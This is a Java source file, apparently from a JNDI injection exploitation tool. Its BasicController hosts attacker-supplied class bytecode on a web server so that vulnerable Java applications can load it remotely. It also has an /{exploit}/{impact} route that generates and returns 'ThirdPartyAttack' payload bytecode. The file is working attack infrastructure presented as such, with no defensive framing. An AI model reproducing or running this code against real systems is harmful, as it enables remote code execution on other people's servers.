package cn.butler.jndi.controller;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.server.WebServer;
import javassist.bytecode.ClassFile;
import cn.butler.payloads.ObjectPayload;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController implements Controller {
    public Object process(byte[] byteCode) {
        String className;

        try {
            ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
            className = classFile.getName();
        } catch (Exception e) {
            return null;
        }
        String path = className;
        //根据包类名创建多级目录
        if (className.contains(".")) {
            path = className.replace(".", "/");
        }
        WebServer.getInstance().serveFile("/" + path + ".class", byteCode);
        return className;
    }

    @JNDIMapping("/{exploit}/{impact}")
    public byte[] function(String explot,String impact){
        System.out.println("[Exploit] Impact: " + explot + ":" + impact);
        String effect = explot+":"+impact;
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",effect);
        return (byte[]) objects[1];
    }
}
